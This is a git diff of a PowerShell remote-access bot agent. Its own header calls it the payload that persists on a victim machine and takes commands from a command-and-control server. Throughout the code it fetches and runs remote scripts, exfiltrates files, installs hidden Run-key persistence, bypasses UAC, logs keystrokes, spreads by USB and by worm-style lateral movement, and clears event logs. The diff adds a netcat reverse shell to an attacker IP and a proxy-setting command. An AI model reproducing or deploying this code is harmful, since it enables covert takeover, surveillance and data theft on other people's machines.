@@ -1,4 +1,9 @@
-﻿$ErrorActionPreference = 'SilentlyContinue'  
+﻿# Agent.ps1 - by @thebenygreen - @eyesopensec
+# This file is generated as pnt.ps1 by the Generator and can be renammed. it's the PAYLOAD that must persist on victim machine. 
+# It receive commands from C2 and execute it on victim machine. This file absolutely need to be CONFIGURED automatically by the generator.exe AND config.ini
+###############################################################################################################################
+
+$ErrorActionPreference = 'SilentlyContinue'  
 #$WindowStyle ='Hidden'
 ############## ENCRYPTION BLOCK ########################
 function Create-AesManagedObject($key, $IV) {
@@ -50,33 +55,34 @@ function Decrypt-String($key, $encryptedStringWithIV) {
 			$aesManaged.Dispose()
 			[System.Text.Encoding]::UTF8.GetString($unencryptedData).Trim([char]0)
 		}
-########################################################         
+
+################## MAIN VARIABLES PREPARATION #########################         
 $c2cEncrypted = (New-Object System.Net.WebClient).DownloadString("GETC2URL") # Retreive good C2 URL and each execution
 [string] $Global:keyreadgetC2 = "KEYTOREADGETC2"
 if ($keyreadgetC2.length -eq 43) {$keyreadgetC2 = $keyreadgetC2 + '=' }
 if ($keyreadgetC2.length -eq 42) {$keyreadgetC2 = $keyreadgetC2 + '==' }
 [string] $Global:c2c = Decrypt-String "$keyreadgetC2" "$c2cEncrypted" 
 [string] $Global:pc = ""
-[string] $Global:upgradeThisPowershell = "UPGRADEPOWERSHELL"
-[string] $Global:scan = "empty"
-[string] $Global:usbspreading = "USBSPREAD" 
-[string] $Global:operation = "MYOPS" 
-[string] $Global:EndopsDate = "ENDDATE"
-[string] $WorkopsStart = "WORKSTART"
-[string] $WorkopsEnd = "WORKEND"
-[string] $keyopsupload = "KEYUPLOAD"
-[string] $keyopsupload2 = "KEYUPLOAD2"
-[string] $Global:regOpskey = "REGKEY" # if empy, it will not be used
-[string] $Global:wmiOpskey = "WMIKEY" # if empy, it will not be used
-[string] $Global:sleeptime1 = "SLPTM1"
-[string] $Global:sleeptime2 = "SLPTM2"
-[string] $Global:sleeptime3 = "SLPTM3"
-[string] $Global:autoOpspersist = "AUTOPERSIST"
-[string] $Global:DefaultOpsPersist = "DEFAULTPERSIST"
+[string] $Global:upgradeThisPowershell = "UPGRADEPOWERSHELL" # Set if PS upgrade must be attempted once executed
+[string] $Global:scan = "empty" # Set if a scan must be attempted once executed
+[string] $Global:usbspreading = "USBSPREAD" # Set if USB spreading must be automatic
+[string] $Global:operation = "MYOPS" # Set Operation name for automation
+[string] $Global:EndopsDate = "ENDDATE" # Timing for operation ending
+[string] $WorkopsStart = "WORKSTART" # Timing for zombie's work start 
+[string] $WorkopsEnd = "WORKEND" # Timing for zombie's work stop
+[string] $keyopsupload = "KEYUPLOAD" # Timing for keylogger function
+[string] $keyopsupload2 = "KEYUPLOAD2" # Timing for keylogger function
+[string] $Global:regOpskey = "REGKEY" # Store ID in Registry. if empy, it will not be used
+[string] $Global:wmiOpskey = "WMIKEY" # Store ID in WMI (need admin).if empy, it will not be used
+[string] $Global:sleeptime1 = "SLPTM1" # Sleep intervals
+[string] $Global:sleeptime2 = "SLPTM2" # Sleep intervals
+[string] $Global:sleeptime3 = "SLPTM3" # Sleep intervals
+[string] $Global:autoOpspersist = "AUTOPERSIST" # Activate auto persistence. agent will try to persist once executed on victim machine
+[string] $Global:DefaultOpsPersist = "DEFAULTPERSIST" # Set Operation name for automation
 [string] $Global:ScreenstreamActivated = "off"
 [string] $Global:myAgntencoded = @"
 MYENCODED
-"@ 
+"@  # add downexec payload in encoded form
 [string] $Global:c2OpsChannel = "C2CHANNEL" # icmp, twitter, dropbox, gmail, dns, http/s
 [string] $Global:DomainOrWorkgroup = (Get-WmiObject Win32_ComputerSystem).Domain
 $ip = ((ipconfig | findstr [0-9].\.)[0]).Split()[-1]
@@ -87,11 +93,10 @@ $y = $ip.split('.')[2]
 $z = $ip.split('.')[3]
 $StartAddress = "$w.$x.$y.1"
 $EndAddress = "$w.$x.$y.254"
-
 [string] $Global:IsAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")
-            
 ######################################################################
-# Test PS version and install CurL if the version is lower than 3. Also try to install Choco and update powershell to v3+         ROOT_FOLDER
+
+# Test PS version and download CurL if the version is lower than 3. Also try to install Choco and update powershell to v3+         ROOT_FOLDER
 [string] $Global:pshversion = $PSVersionTable.psversion.Major
 if ($pshversion -lt 3) {
 	$pversion = 2
@@ -135,7 +140,8 @@ if ($pshversion -lt 3) {
 		[string] $Global:pshversion = $PSVersionTable.psversion.Major
 		}
 	}
-	#General functions
+
+############## GENERAL FUNCTIONS ############## 
 		function base64EncodeText {
 			param( [string]$Text )
 			$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
@@ -160,7 +166,7 @@ if ($pshversion -lt 3) {
 		   $sb = [scriptblock]::create("$code")
 		   Start-Job -ScriptBlock $sb
 			}
-		function downloadFile($url, $targetFile){
+		function downloadFile($url, $targetFile){ # download file to victim pc
 			"Downloading $url"
 			if ($url.Substring(0,5) -ceq "https") {
                 [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $True }
@@ -189,7 +195,7 @@ if ($pshversion -lt 3) {
 			$targetStream.Dispose()
 			$responseStream.Dispose()
 			}
-		function Exfiltrate{
+		function Exfiltrate{ # exfiltrate data from victim to c2 server
 			[CmdletBinding()] param( 
 				[string] $Path
 				) 
@@ -273,14 +279,14 @@ iex ((New-Object Net.WebClient).DownloadString("$c2c/ROOT_FOLDER/link/$runURL"))
 				iex ((New-Object Net.WebClient).DownloadString("$c2c/ROOT_FOLDER/link/Invk-EvtVwrBypass.txt"))
 				ModInvkEvtVwrBypass -Command $Command
 				}   	
-		function TestInternet { # Test internet connexion
+		function TestInternet { # Check internet connexion
 			[CmdletBinding()] 
 			param() 
 			process { 
 			[Activator]::CreateInstance([Type]::GetTypeFromCLSID([Guid]'{DCB00C01-570F-4A9B-8D69-199FDBA5723B}')).IsConnectedToInternet 
 			}  
 		}
-		function TestURLstatus {
+		function TestURLstatus { # Check URL status
 			[CmdletBinding()] param([string] $URL,[string] $runLocal)
 			$HTTP_Request = [System.Net.WebRequest]::Create("$URL")
 			$HTTP_Response = $HTTP_Request.GetResponse()
@@ -346,7 +352,7 @@ $r = "Last user keyboard/mouse input: " + $LastStr
 $r = $r + "---- PC Idle for " + $Idle.Days + " days, " + $Idle.Hours + " hours, " + $Idle.Minutes + " minutes, " + $Idle.Seconds + " seconds."
 		$r
         }
-		function OfflineMode {
+		function OfflineMode { # Commands to execute in OFFLINE MODE
 			localxml = @"
 <?xml version="1.0" encoding="iso-8859-1"?>
 <statuses>
@@ -408,7 +414,7 @@ $r = $r + "---- PC Idle for " + $Idle.Days + " days, " + $Idle.Hours + " hours, 
 			Remove-Item -path $env:userprofile\img\$name.png.png
 			$result
 			}
-		function RandomWait {
+		function RandomWait { # Randomly sleep to wait
 		   [string] $SecondsToWait = (Get-Random -InputObject $sleeptime1, $sleeptime2, $sleeptime3)
 		   Write-Verbose "Sleep: $SecondsToWait sec"
 		   Start-Sleep -Seconds $SecondsToWait
@@ -417,7 +423,7 @@ $r = $r + "---- PC Idle for " + $Idle.Days + " days, " + $Idle.Hours + " hours, 
 			IEX (New-Object Net.WebClient).DownloadString("$c2c/ROOT_FOLDER/link/wmi-create.txt")
             Wmi-Create -EventFilterName "Cleanup" -EventConsumerName "$wmiOpskey" -ValueToCreate "$pc"
 		}
-		function persistAuto {
+		function persistAuto { # Actions for auto persistence
 				$Path =  "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Exec Bypass -NoL -Win Hidden -Enc $myAgntencoded"
 				$registryPath1 = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
 				$registryPath2 = "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run"
@@ -428,8 +434,9 @@ $r = $r + "---- PC Idle for " + $Idle.Days + " days, " + $Idle.Hours + " hours, 
 	if ($autoOpspersist -eq "on") {
 		persistAuto
 		}			
-#############################################################
-## Action & commands of bot ##	
+
+########## ACTIONS & BOT COMMANDS #######################
+# Main function
 Function Invoke-Pnt {
     Write-Host "Action !" -ForegroundColor Yellow;
 	Function Invoke-drn {
@@ -1623,7 +1630,7 @@ powershell.exe -Win hidden -NoL -Non -ep bypass -nop -c IEX((New-Object Net.WebC
 		    [CmdletBinding()] param( 
 			[string]$id
 			)
-			$Results = "OK"
+			$result = "OK"
 			sendC2 $pc $result $id
 			} 
 		Function NgrokTunnelCommand {  # !ngrok|authkey|http|80 -- deploy ngrok so you can remote connect to the zombie
@@ -1679,6 +1686,18 @@ Invoke-PortFwd -bindPort $bindport -destHost $desthost -destPort $destport ;
 		Function CovertChannelCommand { # !covertchannel|gmail|http:\\server\config.ini
 		# switch covert canal to : dns, icmp, gmail, twitter or dropbox (a BIG TASK )
 		}
+		Function SetProxyCommand { # !proxy|213.18.200.13|8484 - Set proxy configuration. you can use fiddler here to see HTTPS. or setup your own proxy 
+		    [CmdletBinding()] param( 
+			[string]$id
+			)
+			[string] $serverip = $LatestTweet.split('|')[1]
+			[string] $serverport = $LatestTweet.split('|')[2]
+			iex((New-Object Net.WebClient).DownloadString("$c2c/ROOT_FOLDER/link/setproxy.txt"))
+			set-proxy -server $serverip -port $serverport
+			Start-Sleep -Seconds 5
+			[string] $result = get-proxy
+			sendC2 $pc $result $id
+			} 
 	#  Lateral movement
 		Function WormCommand { 	 # !worm|login|password
 			[CmdletBinding()] param( 
@@ -1942,7 +1961,7 @@ Invoke-DBC2
 		Function VncCommand{     # !vnc|bind||5900|pass1234   OR  §vnc|reverse|publicIP_of_attacker|5500|pass1234 --Tips: use bind with tunnel command, tunnel use ngrok to expose host in public network
 			[CmdletBinding()] param( 
 			[string]$id
-			)
+			) #USE REVERSE !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
 			[string] $ConnectionType = $LatestOrder.split('|')[1]
 			[string] $VncIPreverse = $LatestOrder.split('|')[2]
 			[string] $VncPort = $LatestOrder.split('|')[3]
@@ -2000,7 +2019,21 @@ iex((New-Object Net.WebClient).DownloadString("http://$serverIPorUrl/connect"))
 			RunJob -code $cmde	
 			$result = "Server side: powershell.exe -Exec Bypass -File c:\AttackerPC\HttpRatServer.ps1 - You edit it before (Better use ngrok URL)"
 			sendC2 $pc $result $id
-			}  			
+			}  
+		Function NetCatShell {  # !nc|212.74.21.23  OR  !nc|xxxxxx.ngrok.io   - RUN BEFORE Server side: nc —v —l —p (port)  
+			[CmdletBinding()] param( 
+			[string]$id
+			)
+			[string] $serverIP = $LatestOrder.split('|')[1]	
+			[string] $serverPort = $LatestOrder.split('|')[2]				
+			$cmde = @"
+iex((New-Object Net.WebClient).DownloadString("$c2c/ROOT_FOLDER/link/ncat.txt"))
+ncat $serverIP $serverPort
+"@
+			RunJob -code $cmde	
+			$result = "Server side: nc —v —l —p (port)  (Better use ngrok URL)"
+			sendC2 $pc $result $id
+			} 	
     # Defense-bypasss > BEGIN
 		Function ClearEventLog { # !clearevent  -- 
 			[CmdletBinding()] param( 
@@ -2395,6 +2428,7 @@ IEX (New-Object Net.WebClient).DownloadString("$c2c/ROOT_FOLDER/link/setMacAttri
 				!ngrok {NgrokTunnelCommand $id} 	  #  !ngrok|authkey|http|80     - Expose zombie(TCP/IP) PC to Internet so that you can connect any tools
 				!socks {SocksProxyCommand $id} 		  #	 !socks|1234 - Create a Socks 4/5 proxy on port 1234
 				!portfwd {PortFwdCommand $id} 		  #  !portfwd|33389|127.0.0.1|3389 -- Create a simple tcp port forward. liste localy on 33389 and forward to local 3389			
+				!proxy {SetProxyCommand $id}          #  !proxy|213.18.200.13|8484 - Set proxy configuration. you can use fiddler here to see HTTPS. or setup your own proxy 
 				#!uaclevel {SetUACLevelCommand $id}   #  !uaclevel|on    ou   uaclevel|off
 				!psexec {PsexecCommand $id}    	  	  #  !psexec|domain\admin|password|192.168.3.202|powershell.exe 'calc.exe'    - download psexec, use credential and push bot in targeted ip 
                 !infectmacro {InfectmacroCommand $id} #  !infectmacro|C:\Users|macro.txt
@@ -2408,8 +2442,9 @@ IEX (New-Object Net.WebClient).DownloadString("$c2c/ROOT_FOLDER/link/setMacAttri
 				!geolocategps{GeolocateGPSCommand $id}#	 !geolocategps
 				!wshell {WebShellCommand $id}         #  !wshell|8080  -  use it with !ngrok to expose localhost port 8080 over Internet
                 !dropboxc2 {DropboxC2Command $id}     #  !dropboxc2  -  start dropbox client backdoor (configure and start python C2 first)  
-				!ReverseShell{ReverseShellCommand $id}#  !reverseshell|AttackerIP|8080  -  use nc -lvp 8080 to connect
-                !meterpreter {MeterpreterShell $id}	  #  !meterpreter|10.0.0.23|443
+				!ReverseShell{ReverseShellCommand $id}#  !reverseshell|AttackerIP|8080  -  use nc -lvp 8080 BEFORE to get shell back
+				!nc{NetCatShell $id}                  #  !nc|AttackerIP|8080  -  use nc -lvp 8080 BEFORE to get shell back             
+				!meterpreter {MeterpreterShell $id}	  #  !meterpreter|10.0.0.23|443
                 !jsrat {JsRatShell $id} 	 		  #  !jsrat|192.168.10.96     # Handle connexion with: powershell.exe -Exe Bypass -File c:\test\JSRat.txt  & change listening IP ADDRESS in jsrat file
                 !httprat {HttpRatShell $id}           #  !httprat|212.74.21.23  OR  !httprat|xxxxxx.ngrok.io   (without HTTP/s) 
 				!vnc {VncCommand $id}                 #  !vnc|bind||5900|pass1234   OR  §vnc|reverse|IP_of_attacker|5500|pass1234
@@ -2522,7 +2557,7 @@ IEX (New-Object Net.WebClient).DownloadString("$c2c/ROOT_FOLDER/link/setMacAttri
 		}
 	}	
 }
-## Create bot instance in C2C Server
+## Create and initialize bot instance on C2C Server
 Function InitializeBot {
 	$ip = ((ipconfig | findstr [0-9].\.)[0]).Split()[-1] #
 	$computerName = (gi env:\Computername).Value #
@@ -2645,7 +2680,6 @@ if(($regOpskey) -AND !($wmiOpskey)){
 			}
 		}
 }
-
 if(!($regOpskey) -AND ($wmiOpskey)){
 	if (!(Get-WmiObject -Namespace root/subscription -Query "select * from CommandLineEventConsumer where name=`"$wmiOpskey`"")) { 	
 		echo "empty value (WMI)"
@@ -2699,7 +2733,6 @@ if(!($regOpskey) -AND ($wmiOpskey)){
 			}
 		}
 }
-
 if(($regOpskey) -AND ($wmiOpskey)){
 	if (!(get-itemproperty -path HKCU:\Software\$regOpskey -name "$regOpskey").$regOpskey) { 
 		echo "empty REG key"
